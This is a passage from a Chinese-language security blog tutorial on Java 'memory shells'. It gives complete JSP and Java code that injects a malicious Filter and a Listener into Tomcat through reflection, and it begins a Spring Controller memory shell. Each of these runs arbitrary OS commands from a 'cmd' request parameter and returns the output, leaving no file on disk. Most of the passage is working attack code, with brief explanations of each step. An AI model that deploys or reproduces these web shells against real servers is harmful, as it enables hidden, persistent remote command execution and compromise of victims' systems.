standardContext.addFilterDef(filterDef);</span><br><span class="line">        <span class="type">FilterMap</span> <span class="variable">filterMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterMap</span>();</span><br><span class="line">        filterMap.setFilterName(filterName);</span><br><span class="line">        filterMap.addURLPattern(<span class="string">&quot;/*&quot;</span>);</span><br><span class="line">        filterMap.setDispatcher(DispatcherType.REQUEST.name());</span><br><span class="line">        standardContext.addFilterMapBefore(filterMap);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">ApplicationFilterConfig</span> <span class="variable">applicationFilterConfig</span> <span class="operator">=</span> (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);</span><br><span class="line">        filterConfigs.put(filterName, applicationFilterConfig);</span><br><span class="line">        out.print(<span class="string">&quot;[+]&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;Malicious filter injection successful!&lt;br&gt;[+]&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;Filter name: &quot;</span> + filterName + <span class="string">&quot;&lt;br&gt;[+]&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;Below is a list displaying filter names and their corresponding URL patterns:&quot;</span>);</span><br><span class="line">        out.println(<span class="string">&quot;&lt;table border=&#x27;1&#x27;&gt;&quot;</span>);</span><br><span class="line">        out.println(<span class="string">&quot;&lt;tr&gt;&lt;th&gt;Filter Name&lt;/th&gt;&lt;th&gt;URL Patterns&lt;/th&gt;&lt;/tr&gt;&quot;</span>);</span><br><span class="line">        List&lt;String[]&gt; allUrlPatterns = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (Object filterConfigObj : filterConfigs.values()) &#123;</span><br><span class="line">            <span class="keyword">if</span> (filterConfigObj <span class="keyword">instanceof</span> ApplicationFilterConfig) &#123;</span><br><span class="line">                <span class="type">ApplicationFilterConfig</span> <span class="variable">filterConfig</span> <span class="operator">=</span> (ApplicationFilterConfig) filterConfigObj;</span><br><span class="line">                <span class="type">String</span> <span class="variable">filtername</span> <span class="operator">=</span> filterConfig.getFilterName();</span><br><span class="line">                <span class="type">FilterDef</span> <span class="variable">filterdef</span> <span class="operator">=</span> standardContext.findFilterDef(filtername);</span><br><span class="line">                <span class="keyword">if</span> (filterdef != <span class="literal">null</span>) &#123;</span><br><span class="line">                    FilterMap[] filterMaps = standardContext.findFilterMaps();</span><br><span class="line">                    <span class="keyword">for</span> (FilterMap filtermap : filterMaps) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (filtermap.getFilterName().equals(filtername)) &#123;</span><br><span class="line">                            String[] urlPatterns = filtermap.getURLPatterns();</span><br><span class="line">                            allUrlPatterns.add(urlPatterns); <span class="comment">// 将当前迭代的urlPatterns添加到列表中</span></span><br><span class="line"></span><br><span class="line">                            out.println(<span class="string">&quot;&lt;tr&gt;&lt;td&gt;&quot;</span> + filtername + <span class="string">&quot;&lt;/td&gt;&quot;</span>);</span><br><span class="line">                            out.println(<span class="string">&quot;&lt;td&gt;&quot;</span> + String.join(<span class="string">&quot;, &quot;</span>, urlPatterns) + <span class="string">&quot;&lt;/td&gt;&lt;/tr&gt;&quot;</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        out.println(<span class="string">&quot;&lt;/table&gt;&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (String[] urlPatterns : allUrlPatterns) &#123;</span><br><span class="line">            <span class="keyword">for</span> (String pattern : urlPatterns) &#123;</span><br><span class="line">                <span class="keyword">if</span> (!pattern.equals(<span class="string">&quot;/*&quot;</span>)) &#123;</span><br><span class="line">                    out.println(<span class="string">&quot;[+]&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;shell: http://localhost:8080/test&quot;</span> + pattern + <span class="string">&quot;?cmd=ipconfig&lt;br&gt;&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;%!</span><br><span class="line">    <span class="keyword">private</span> String <span class="title function_">getRandomString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">characters</span> <span class="operator">=</span> <span class="string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span>;</span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">randomString</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">8</span>; i++) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> (<span class="type">int</span>) (Math.random() * characters.length());</span><br><span class="line">            randomString.append(characters.charAt(index));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> randomString.toString();</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p>效果如下：</p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240117144501712.png"></p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240117145703582.png"></p><p>同样的，这里我也适配了中文编码，和一些提示性语句的输出。</p><h3 id="3-2-2-servlet内存马demo代码分析"><a href="#3-2-2-servlet内存马demo代码分析" class="headerlink" title="3.2.2 servlet内存马demo代码分析"></a>3.2.2 servlet内存马demo代码分析</h3><p>我们分开来分析，首先看这段代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getSession().getServletContext();</span><br><span class="line"><span class="type">Field</span> <span class="variable">appctx</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">appctx.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) appctx.get(servletContext);</span><br><span class="line"><span class="type">Field</span> <span class="variable">stdctx</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">stdctx.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) stdctx.get(applicationContext);</span><br><span class="line"><span class="type">Field</span> <span class="variable">filterConfigsField</span> <span class="operator">=</span> standardContext.getClass().getDeclaredField(<span class="string">&quot;filterConfigs&quot;</span>);</span><br><span class="line">filterConfigsField.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">Map</span> <span class="variable">filterConfigs</span> <span class="operator">=</span> (Map) filterConfigsField.get(standardContext);</span><br></pre></td></tr></table></figure><p>先是获取当前的<code>servlet</code>上下文并拿到其私有字段<code>context</code>，然后设置可访问，这样就可以通过反射这个<code>context</code>字段的值，这个值是一个<code>ApplicationContext</code>对象；接着获取<code>ApplicationContext</code>的私有字段<code>context</code>并设置可访问，然后通过反射获取<code>ApplicationContext</code>的<code>context</code>字段的值，这个值是一个<code>StandardContext</code>对象；最后是获取<code>StandardContext</code>的私有字段<code>filterConfigs</code>，设置可访问之后通过反射获取<code>StandardContext</code>的<code>filterConfigs</code>字段的值。</p><p>中间的构造匿名类的部分就不说了，和之前的<code>Servlet</code>是很像的，别忘记最后的<code>filterChain.doFilter</code>就行。</p><p>然后是这段代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">FilterDef</span> <span class="variable">filterDef</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterDef</span>();</span><br><span class="line">filterDef.setFilterName(filterName);</span><br><span class="line">filterDef.setFilterClass(filter.getClass().getName());</span><br><span class="line">filterDef.setFilter(filter);</span><br><span class="line">standardContext.addFilterDef(filterDef);</span><br><span class="line"><span class="type">FilterMap</span> <span class="variable">filterMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterMap</span>();</span><br><span class="line">filterMap.setFilterName(filterName);</span><br><span class="line">filterMap.addURLPattern(<span class="string">&quot;/*&quot;</span>);</span><br><span class="line">filterMap.setDispatcher(DispatcherType.REQUEST.name());</span><br><span class="line">standardContext.addFilterMapBefore(filterMap);</span><br><span class="line"><span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);</span><br><span class="line">constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">ApplicationFilterConfig</span> <span class="variable">applicationFilterConfig</span> <span class="operator">=</span> (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);</span><br><span class="line">filterConfigs.put(filterName, applicationFilterConfig);</span><br></pre></td></tr></table></figure><p>也就是定义我们自己的<code>filterDef</code>和<code>FilterMap</code>并加入到<code>srandardContext</code>中，接着反射获取 <code>ApplicationFilterConfig</code> 类的构造函数并将构造函数设置为可访问，然后创建了一个 <code>ApplicationFilterConfig</code> 对象的实例，接着将刚刚创建的实例添加到过滤器配置的 <code>Map</code> 中，<code>filterName</code> 为键，这样就可以将动态创建的过滤器配置信息加入应用程序的全局配置中。</p><p>需要注意的是，在<code>tomcat 7</code>及以前<code>FilterDef</code>和<code>FilterMap</code>这两个类所属的包名是：</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.deploy.FilterMap&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.deploy.FilterDef&quot;</span> %&gt;</span><br></pre></td></tr></table></figure><p><code>tomcat 8</code>及以后，包名是这样的：</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.tomcat.util.descriptor.web.FilterDef&quot;</span> %&gt;</span><br></pre></td></tr></table></figure><p>由于这方面的区别，最好是直接都用反射去写这个<code>filter</code>内存马，具体<code>demo</code>参考：</p><blockquote><p><a href="https://github.com/feihong-cs/memShell/blob/master/src/main/java/com/memshell/tomcat/FilterBasedWithoutRequestVariant.java">https://github.com/feihong-cs/memShell/blob/master/src/main/java/com/memshell/tomcat/FilterBasedWithoutRequestVariant.java</a></p></blockquote><p>还有个需要注意的点就是，我给出的这个<code>demo</code>代码只适用于<code>tomcat 7</code>及以上，因为  <code>filterMap.setDispatcher(DispatcherType.REQUEST.name());</code>这行代码中用到的<code>DispatcherType</code>是在<code>Servlet 3.0</code>规范中才有的。</p><h3 id="3-2-3-tomcat6下filter内存马的编写"><a href="#3-2-3-tomcat6下filter内存马的编写" class="headerlink" title="3.2.3 tomcat6下filter内存马的编写"></a>3.2.3 tomcat6下filter内存马的编写</h3><p>这里直接贴出参考文章，后面有空的话，会在我的博客中补全这部分的研究：</p><blockquote><p><a href="https://xz.aliyun.com/t/9914">https://xz.aliyun.com/t/9914</a></p><p><a href="https://mp.weixin.qq.com/s/sAVh3BLYNHShKwg3b7WZlQ">https://mp.weixin.qq.com/s/sAVh3BLYNHShKwg3b7WZlQ</a></p><p><a href="https://www.cnblogs.com/CoLo/p/16840371.html">https://www.cnblogs.com/CoLo/p/16840371.html</a></p><p><a href="https://flowerwind.github.io/2021/10/11/tomcat6%E3%80%817%E3%80%818%E3%80%819%E5%86%85%E5%AD%98%E9%A9%AC/">https://flowerwind.github.io/2021/10/11/tomcat6、7、8、9内存马/</a></p><p><a href="https://9bie.org/index.php/archives/960/">https://9bie.org/index.php/archives/960/</a></p><p><a href="https://github.com/xiaopan233/GenerateNoHard">https://github.com/xiaopan233/GenerateNoHard</a></p><p><a href="https://github.com/ax1sX/MemShell/tree/main/TomcatMemShell">https://github.com/ax1sX/MemShell/tree/main/TomcatMemShell</a></p></blockquote><h2 id="3-3-Listener内存马"><a href="#3-3-Listener内存马" class="headerlink" title="3.3 Listener内存马"></a>3.3 Listener内存马</h2><h3 id="3-3-1-简单的Listener内存马demo编写"><a href="#3-3-1-简单的Listener内存马demo编写" class="headerlink" title="3.3.1 简单的Listener内存马demo编写"></a>3.3.1 简单的Listener内存马demo编写</h3><p>根据我们在上面的<code>2.9</code>节中所讨论的内容，我们可以得出以下结论：</p><p>如果我们想要写一个<code>Listener</code>内存马，需要经过以下步骤：</p><ul><li>继承并编写一个恶意<code>Listener</code></li><li>获取<code>StandardContext</code></li><li>调用<code>StandardContext.addApplicationEventListener()</code>添加恶意<code>Listener</code></li></ul><p>由以上结论我们可以写出如下内存马<code>demo</code>：</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.connector.Request&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.InputStream&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Scanner&quot;</span> %&gt;</span><br><span class="line"></span><br><span class="line">&lt;%!</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EvilListener</span> <span class="keyword">implements</span> <span class="title class_">ServletRequestListener</span> &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestDestroyed</span><span class="params">(ServletRequestEvent sre)</span> &#123;</span><br><span class="line">            <span class="type">HttpServletRequest</span> <span class="variable">req</span> <span class="operator">=</span> (HttpServletRequest) sre.getServletRequest();</span><br><span class="line">            <span class="keyword">if</span> (req.getParameter(<span class="string">&quot;cmd&quot;</span>) != <span class="literal">null</span>)&#123;</span><br><span class="line">                <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    in = Runtime.getRuntime().exec(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>,<span class="string">&quot;/c&quot;</span>,req.getParameter(<span class="string">&quot;cmd&quot;</span>)&#125;).getInputStream();</span><br><span class="line">                    <span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(in, <span class="string">&quot;GBK&quot;</span>).useDelimiter(<span class="string">&quot;\\A&quot;</span>);</span><br><span class="line">                    <span class="type">String</span> <span class="variable">out</span> <span class="operator">=</span> s.hasNext()?s.next():<span class="string">&quot;&quot;</span>;</span><br><span class="line">                    <span class="type">Field</span> <span class="variable">requestF</span> <span class="operator">=</span> req.getClass().getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">                    requestF.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                    <span class="type">Request</span> <span class="variable">request</span> <span class="operator">=</span> (Request)requestF.get(req);</span><br><span class="line">                    request.getResponse().setCharacterEncoding(<span class="string">&quot;GBK&quot;</span>);</span><br><span class="line">                    request.getResponse().getWriter().write(out);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">catch</span> (Exception ignored) &#123;&#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestInitialized</span><span class="params">(ServletRequestEvent sre)</span> &#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    <span class="type">Field</span> <span class="variable">reqF</span> <span class="operator">=</span> request.getClass().getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">    reqF.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">Request</span> <span class="variable">req</span> <span class="operator">=</span> (Request) reqF.get(request);</span><br><span class="line">    <span class="type">StandardContext</span> <span class="variable">context</span> <span class="operator">=</span> (StandardContext) req.getContext();</span><br><span class="line">    <span class="type">EvilListener</span> <span class="variable">evilListener</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EvilListener</span>();</span><br><span class="line">    context.addApplicationEventListener(evilListener);</span><br><span class="line">    out.println(<span class="string">&quot;[+]&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;Inject Listener Memory Shell successfully!&lt;br&gt;[+]&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;Shell url: http://localhost:8080/test/?cmd=ipconfig&quot;</span>);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p>效果如下：</p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240117232349151.png"></p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240117232401259.png"></p><h3 id="3-3-2-Listener内存马demo代码分析"><a href="#3-3-2-Listener内存马demo代码分析" class="headerlink" title="3.3.2 Listener内存马demo代码分析"></a>3.3.2 Listener内存马demo代码分析</h3><p>最关键部分的代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Field</span> <span class="variable">reqF</span> <span class="operator">=</span> request.getClass().getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">reqF.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">Request</span> <span class="variable">req</span> <span class="operator">=</span> (Request) reqF.get(request);</span><br><span class="line"><span class="type">StandardContext</span> <span class="variable">context</span> <span class="operator">=</span> (StandardContext) req.getContext();</span><br><span class="line"><span class="type">EvilListener</span> <span class="variable">evilListener</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EvilListener</span>();</span><br><span class="line">context.addApplicationEventListener(evilListener);</span><br></pre></td></tr></table></figure><p>前面四行代码干一件事：获取<code>StandardContext</code>；后两行干代码干这两件事：实例化我们编写的恶意<code>Listener</code>，调用<code>addApplicationEventListener</code>方法加入到<code>applicationEventListenersList</code>中去，这样最终就会到<code>eventListener</code>。</p><h1 id="四、Spring-MVC框架型内存马"><a href="#四、Spring-MVC框架型内存马" class="headerlink" title="四、Spring MVC框架型内存马"></a>四、Spring MVC框架型内存马</h1><h2 id="4-1-Spring-Controller型内存马"><a href="#4-1-Spring-Controller型内存马" class="headerlink" title="4.1 Spring Controller型内存马"></a>4.1 Spring Controller型内存马</h2><h3 id="4-1-1-简单的Spring-Controller型内存马demo编写"><a href="#4-1-1-简单的Spring-Controller型内存马demo编写" class="headerlink" title="4.1.1 简单的Spring Controller型内存马demo编写"></a>4.1.1 简单的Spring Controller型内存马demo编写</h3><p>由<code>2.11.2.2</code>节中的分析可知，要编写一个<code>spring controller</code>型内存马，需要经过以下步骤：</p><ul><li>获取<code>WebApplicationContext</code></li><li>获取<code>RequestMappingHandlerMapping</code>实例</li><li>通过反射获得自定义<code>Controller</code>的恶意方法的<code>Method</code>对象</li><li>定义<code>RequestMappingInfo</code></li><li>动态注册<code>Controller</code></li></ul><p>代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.springcontrollermemoryshellexample.demos.web;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.WebApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.request.RequestContextHolder;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.request.ServletRequestAttributes;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.mvc.condition.PatternsRequestCondition;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.mvc.method.RequestMappingInfo;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestEvilController</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String <span class="title function_">getRandomString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">characters</span> <span class="operator">=</span> <span class="string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span>;</span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">randomString</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">8</span>; i++) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> (<span class="type">int</span>) (Math.random() * characters.length());</span><br><span class="line">            randomString.append(characters.charAt(index));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> randomString.toString();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/inject&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">inject</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">controllerName</span> <span class="operator">=</span> <span class="string">&quot;/&quot;</span> + getRandomString();</span><br><span class="line">        <span class="type">WebApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(<span class="string">&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="type">RequestMappingHandlerMapping</span> <span class="variable">requestMappingHandlerMapping</span> <span class="operator">=</span> context.getBean(RequestMappingHandlerMapping.class);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> InjectedController.class.getMethod(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">        <span class="type">PatternsRequestCondition</span> <span class="variable">urlPattern</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PatternsRequestCondition</span>(controllerName);</span><br><span class="line">        <span class="type">RequestMethodsRequestCondition</span> <span class="variable">condition</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RequestMethodsRequestCondition</span>();</span><br><span class="line">        <span class="type">RequestMappingInfo</span> <span class="variable">info</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RequestMappingInfo</span>(urlPattern, condition, <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line">        <span class="type">InjectedController</span> <span class="variable">injectedController</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InjectedController</span>();</span><br><span class="line">        requestMappingHandlerMapping.registerMapping(info, injectedController, method);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;[+] Inject successfully!&lt;br&gt;[+] shell url: http://localhost:8080&quot;</span> + controllerName + <span class="string">&quot;?cmd=ipconfig&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RestController</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">InjectedController</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">InjectedController</span><span class="params">()</span>&#123;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">cmd</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">            <span class="type">HttpServletRequest</span> <span class="variable">request</span> <span class="operator">=</span> ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getRequest();</span><br><span class="line">            <span class="type">HttpServletResponse</span> <span class="variable">response</span> <span class="operator">=</span> ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getResponse();</span><br><span class="line">            response.setCharacterEncoding(<span class="string">&quot;GBK&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (request.getParameter(<span class="string">&quot;cmd&quot;</span>) != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="type">boolean</span> <span class="variable">isLinux</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">                <span class="type">String</span> <span class="variable">osTyp</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">                <span class="keyword">if</span> (osTyp != <span class="literal">null</span> &amp;&amp; osTyp.toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">                    isLinux = <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                String[] cmds = isLinux ? <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, request.getParameter(<span class="string">&quot;cmd&quot;</span>)&#125; : <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, 